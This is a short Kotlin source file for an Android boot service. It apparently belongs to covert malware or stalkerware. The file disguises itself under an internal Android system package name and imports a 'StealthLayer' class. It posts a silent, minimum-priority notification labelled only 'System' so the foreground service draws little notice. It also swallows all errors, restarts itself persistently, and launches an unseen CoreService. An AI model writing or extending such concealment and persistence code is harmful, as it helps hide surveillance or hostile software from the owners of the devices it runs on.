package com.android.internal.os

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.google.system.StealthLayer

class BootService : Service() {
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            val chan = NotificationChannel("boot_ch", "Boot", NotificationManager.IMPORTANCE_MIN).apply {
                setSound(null, null); setShowBadge(false)
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
            val notif = NotificationCompat.Builder(this, "boot_ch")
                .setContentTitle("System")
                .setContentText("Starting")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true)
                .build()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(7777, notif, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(7777, notif)
            }
        } catch (_: Exception) {}

        try {
            val core = CoreService.getInstance()
            if (!core.isReady()) {
                core.init(this)
                core.startServices()
            }
        } catch (_: Exception) {}
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
